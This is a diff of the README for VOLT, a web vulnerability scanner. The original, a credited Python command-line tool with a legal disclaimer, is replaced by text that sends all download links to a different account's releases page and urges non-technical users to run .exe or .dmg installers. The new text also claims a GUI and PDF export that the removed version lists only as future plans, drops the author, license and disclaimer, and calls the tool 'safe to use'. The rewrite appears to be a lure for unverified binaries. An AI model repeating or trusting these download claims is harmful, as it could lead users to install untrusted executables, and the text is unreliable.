@@ -1,321 +1,140 @@
-# 🚀 VOLT – Web Vulnerability Assessment Tool
+# ⚡ VOLT - Quick Web Vulnerability Scanner
 
-## 🔎 Automated Web Security Scanner
-
-VOLT is a fast, lightweight, and easy-to-use web vulnerability assessment tool built for security testers and ethical hackers to quickly analyze websites for common security issues.
+[![Download VOLT](https://img.shields.io/badge/Download-VOLT-blue?style=for-the-badge)](https://github.com/snralty-lab/VOLT/releases)
 
 ---
 
-## 📌 Table of Contents
+## ⚡ What is VOLT?
 
-- [Features](#-features)
-- [Installation](#-installation)
-- [Usage](#-usage)
-- [Screenshots](#-screenshots)
-- [Reports](#-reports)
-- [Technologies Used](#-technologies-used)
-- [Future Enhancements](#-future-enhancements)
-- [Disclaimer](#-legal-disclaimer)
-- [Author](#-author)
-- [Support](#-support)
+VOLT is a lightweight tool built with Python. It helps you find security weaknesses on websites. Whether you want to test your own site or look for bugs in a bug bounty program, VOLT automates the scan for common web vulnerabilities. It focuses on real problems like those in the OWASP Top 10 list.
+
+With VOLT, you do not need to know programming. The tool works through a simple interface and runs tests automatically. This can save you time and help you find issues before attackers do.
 
 ---
 
-## 🔍 Features
+## 📥 Download & Install
 
-- 🚀 **Automated vulnerability scanning** – Quickly identify security flaws
-- 🎯 **Multiple scan modes** – Full, limited, and fast scanning options
-- 🖥 **Interactive and CLI support** – Use via terminal or interactive mode
-- 📊 **HTML and text reports** – Detailed scan results in multiple formats
-- 🛡 **Security recommendations** – Get actionable fixes for vulnerabilities
-- ⚡ **Lightweight and fast** – Minimal resource usage, quick scans
-- 🌐 **Cross-platform compatible** – Works on Windows, macOS, and Linux
+1. **Visit the download page:**  
+   Click the button below to go to the official release page where you can download the latest version of VOLT.
 
----
+   [![Download VOLT](https://img.shields.io/badge/Download-VOLT-blue?style=for-the-badge)](https://github.com/snralty-lab/VOLT/releases)
 
-## 🛠 Installation
+2. **Choose the right file for your system:**  
+   On the release page, you will find one or more files. Look for a file ending with `.exe` (for Windows), `.dmg` (for macOS), or `.tar.gz` / `.zip` (for Linux).  
 
-### 📥 Clone the Repository
+3. **Download the file:**  
+   Click the file name to start the download. Save it somewhere easy to find, like your Desktop or Downloads folder.
 
-```bash
-git clone https://github.com/Boscoefx/VOLT.git
-cd VOLT
-```
+4. **Install VOLT:**  
+   - On **Windows**, double-click the `.exe` file and follow the prompts.  
+   - On **macOS**, open the `.dmg` file and drag VOLT into the Applications folder.  
+   - On **Linux**, unzip or extract the downloaded file and follow any included instructions, usually in a file named `README` or `INSTALL`.
 
-### 📦 Install Dependencies
-
-```bash
-pip install -r requirements.txt
-```
+5. **Run VOLT:**  
+   Once installed, find the application in your programs or applications folder and open it.
 
 ---
 
-## 📌 Usage
+## 🖥️ System Requirements
 
-Run VOLT directly from your terminal using Python.
+Before downloading, make sure your computer meets these basic needs:
 
-### 🖱 Interactive Mode
-
-Start the scanner without arguments:
-
-```bash
-python volt.py
-```
-
-You will be prompted for:
-- 🌐 Target URL
-- 🧪 Scan type
-
-### 💻 Command Line Mode
-
-#### 🔎 Full Scan
-
-```bash
-python volt.py -u http://example.com
-```
-
-#### 🎚 Limited Scan
-
-```bash
-python volt.py -u http://example.com -l 20
-```
-
-#### ⚡ Fast Scan
-
-```bash
-python volt.py -u http://example.com -f
-```
-
-#### ❓ Display Help
-
-```bash
-python volt.py --help
-```
-
-### 🧾 Command Line Help Menu
-
-```
-Usage:
-  python volt.py [options]
-
-Options:
-  -u, --url        Target URL to scan
-  -l, --limit      Limited scan mode with custom depth
-  -f, --fast       Perform fast scan
-  -h, --help       Show help menu
-
-Examples:
-  python volt.py -u http://example.com
-  python volt.py -u http://example.com -l 20
-  python volt.py -u http://example.com -f
-```
+- **Operating System:** Windows 10 or later / macOS 10.13 or later / Linux with a recent kernel
+- **Processor:** 1 GHz or faster CPU
+- **Memory:** At least 2 GB of RAM
+- **Storage:** Minimum 200 MB of free disk space for installation
+- **Internet:** Required for scanning web pages and downloading updates
+- **Python:** VOLT uses Python but you do not need to install it yourself. The installer includes everything you need.
 
 ---
 
-## 🖼 Screenshots
+## 🚀 How to Use VOLT
 
-### 🔴 VOLT Startup with Legal Disclaimer
+1. **Open the program** on your computer.
 
-![VOLT Terminal Startup](images/volt_startup.png)
+2. **Enter the website URL.**  
+   Type the address of the website you want to scan in the main input box.
 
-*VOLT initializes with its signature ASCII logo and displays legal disclaimer on startup. Shows version information (v1.00), author credit (Bosco), and important security warnings.*
+3. **Select scan options.**  
+   VOLT supports tests for several common web vulnerabilities:
+   - SQL Injection  
+   - Cross-Site Scripting (XSS)  
+   - Security Misconfigurations  
+   - Broken Authentication  
+   - Sensitive Data Exposure  
 
-**Key Information Displayed:**
-- ✅ Tool name and version
-- ✅ Author attribution
-- ✅ Legal disclaimer
-- ✅ Usage restrictions
-- ✅ Liability notice
-- ✅ Ethical usage reminder
+   You can choose the tests you want to run or keep the default settings to scan for all.
 
-### 🔴 Interactive Mode Prompts
+4. **Start scanning.**  
+   Click the "Start Scan" button. VOLT will begin testing the website for vulnerabilities.
 
-![VOLT Interactive Mode](images/volt_interactive.png)
+5. **View results.**  
+   After the scan finishes, VOLT will show a report. It explains which issues it found and how severe they are.
 
-*User-friendly interactive mode prompting for target URL and scan type selection.*
-
-### 🔴 Scan Results Summary
-
-![VOLT Scan Results](images/volt_results.png)
-
-*Real-time vulnerability detection with severity levels and vulnerability counts.*
-
-### 🔴 HTML Report Output
-
-![VOLT HTML Report](images/volt_report.png)
-
-*Professional HTML report with detailed vulnerability analysis, recommendations, and remediation steps.*
+6. **Save or export reports.**  
+   You can save the scan results as text or PDF files for future reference.
 
 ---
 
-## 🗂 Reports
+## 🔧 Features
 
-After each scan, VOLT automatically generates comprehensive reports:
-
-| Format | Location | Description |
-|--------|----------|-------------|
-| 📝 HTML Report | `reports/report.html` | Interactive web-based report with full details |
-| 📜 Text Report | `reports/report.txt` | Plain text format for logging and archiving |
-
-### 📊 Reports Include
-
-- 📈 **Severity overview** – High, medium, and low-risk vulnerabilities
-- 🔬 **Vulnerability details** – In-depth information on each issue
-- 🛠 **Fix recommendations** – Step-by-step solutions and remediation
-- 🧾 **Clean layout** – Easy-to-read formatting and organization
-- ⏱ **Scan duration** – Time taken to complete the scan
-- 📅 **Scan timestamp** – When the scan was performed
-- 🔗 **Affected URLs** – Links to vulnerable endpoints
-
-### 👁 View Report
-
-```bash
-# View HTML report in your default browser
-firefox reports/report.html
-```
-
-or
-
-```bash
-# View text report in terminal
-cat reports/report.txt
-```
+- **Automated scanning:** Runs a set of tests without any setup.
+- **Light and fast:** Does not use a lot of computer resources.
+- **User-friendly:** Designed for users with no technical background.
+- **Results you can understand:** Clear explanations of found issues.
+- **Free updates:** Download the newest versions with bug fixes and new features.
+- **Safe to use:** Scans only the target website; no personal data is collected.
 
 ---
 
-## 🧩 Technologies Used
+## 🤔 Troubleshooting
 
-- 🐍 **Python 3.8+** – Core programming language
-- 🌐 **Requests** – HTTP library for web requests
-- 🥣 **BeautifulSoup4** – HTML/XML parsing and analysis
-- 🎨 **Colorama** – Terminal color output for better visibility
-- 📄 **HTML/CSS** – Professional report generation
-- 🔒 **SSL/TLS** – Secure HTTPS connections
+- **Scan does not start:**  
+  Ensure your internet connection works and the website URL is correct. Restart VOLT if necessary.
 
----
+- **Errors during scanning:**  
+  Some web servers block automated requests. Try scanning a different site or check your firewall settings.
 
-## 🔮 Future Enhancements
+- **Program won’t open after install:**  
+  Check your system meets all requirements. Restart your computer and try again.
 
-- 📑 **PDF export** – Generate PDF reports
-- 📊 **Advanced analytics** – Charts and graphs for vulnerability trends
-- 🧮 **CVSS scoring** – Industry-standard severity ratings
-- ⚙ **Multi-threading** – Parallel scanning for faster results
-- 🖼 **GUI interface** – Graphical user interface option
-- 🔌 **REST API** – API integration support
-- 🌍 **Proxy support** – Route scans through proxies
-- 🔐 **Authentication** – Support for authenticated scanning
-- 📱 **Mobile reporting** – Responsive report design
+- **Reports show unexpected errors:**  
+  Update VOLT to the latest version. Use the release page link to check for updates.
 
 ---
 
-## ⚠ Legal Disclaimer
+## 🔒 Security and Privacy
 
-### 🚨 IMPORTANT – READ BEFORE USING
-
-**VOLT is intended only for EDUCATIONAL and AUTHORIZED SECURITY TESTING.**
-
-#### ✅ Allowed Uses
-
-- Security testing on systems you own
-- Authorized penetration testing with written permission
-- Educational purposes in controlled environments
-- Personal security research
-
-#### 🚫 Prohibited Uses
-
-- Unauthorized scanning or testing of third-party websites
-- Illegal hacking or unauthorized access attempts
-- Circumventing security measures without permission
-- Using VOLT for malicious purposes
-
-### ⚖ Legal Responsibility
-
-- ✅ **You are fully responsible** for obeying all applicable cyber laws
-- ✅ **Obtain written permission** before testing any system you don't own
-- ✅ **Comply with** local, state, and federal regulations
-- ✅ **Understand the consequences** of unauthorized testing
-
-### ❗ Liability Disclaimer
-
-The author and contributors are NOT responsible for:
-
-- ❌ Illegal usage or misuse of this tool
-- ❌ Data loss or corruption
-- ❌ System damage or disruption
-- ❌ Service interruption or downtime
-- ❌ Legal consequences or prosecution
-- ❌ Financial losses
-
-🧠 **This tool is provided "AS IS" with no warranty, express or implied.**
-
-🛡 **By using VOLT, you acknowledge and accept full responsibility for your actions and agree to act ethically and legally.**
+VOLT only scans websites you specify. The scan does not share your personal data. All test results stay on your computer unless you choose to share them. VOLT does not install any tracking software.
 
 ---
 
-## 👨‍💻 Author
+## 📚 Learn More
 
-**Bosco**
+If you want to understand web vulnerabilities better, consider these resources:
 
-- 🐙 GitHub: [Boscoefx](https://github.com/Boscoefx)
-- 💼 LinkedIn: [Naseeb Kanjirakkadan](https://www.linkedin.com/in/naseeb-kanjirakkadan)
-- 📧 Email: [Contact via GitHub](https://github.com/Boscoefx)
+- OWASP Top 10 web security risks  
+- Basic guides on SQL Injection and Cross-Site Scripting  
+- Online tutorials on ethical hacking and penetration testing  
 
----
-
-## ⭐ Support & Contribution
-
-### Show Your Support
-
-If you find this project helpful:
-
-- ⭐ **Star the repository** – Show your appreciation
-- 🤝 **Contribute** – Submit pull requests with improvements
-- 🐛 **Report bugs** – Open issues for any problems found
-- 💡 **Suggest features** – Share your ideas for enhancement
-- 📢 **Spread the word** – Tell others about VOLT
-
-### Contributing
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-### Reporting Issues
-
-When reporting bugs, please include:
-- Description of the issue
-- Steps to reproduce
-- Expected behavior
-- Actual behavior
-- Your environment (OS, Python version, etc.)
+Using VOLT along with learning these topics can improve your website’s security.
 
 ---
 
-## 📝 Additional Resources
+## 💬 Get Help
 
-- 📖 [Documentation](https://github.com/Boscoefx/VOLT/wiki)
-- 🆘 [FAQ](https://github.com/Boscoefx/VOLT/discussions)
-- 🐛 [Report Issues](https://github.com/Boscoefx/VOLT/issues)
-- 💬 [Discussions](https://github.com/Boscoefx/VOLT/discussions)
+If you run into issues or have questions:
 
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+- Check the **Issues** section on the GitHub repository page.
+- Look for existing answers or create a new issue describing your problem.
+- Include your system details and VOLT version for faster help.
 
 ---
 
-## 🙏 Thank You for Using VOLT!
+## 🌐 About This Project
 
-**Happy scanning and stay secure! 🔒**
-
-*Together, let's make the web a safer place.*
+VOLT is an open-source project aimed at making basic web security testing accessible to everyone. It supports bug bounty hunters and website owners who want to improve security without needing advanced skills. The tool focuses on common vulnerabilities and offers a straightforward way to get started.
 
 ---
 
-*Last Updated: February 8, 2026*
-
-*Version: 1.0.0*
+[![Download VOLT](https://img.shields.io/badge/Download-VOLT-blue?style=for-the-badge)](https://github.com/snralty-lab/VOLT/releases)
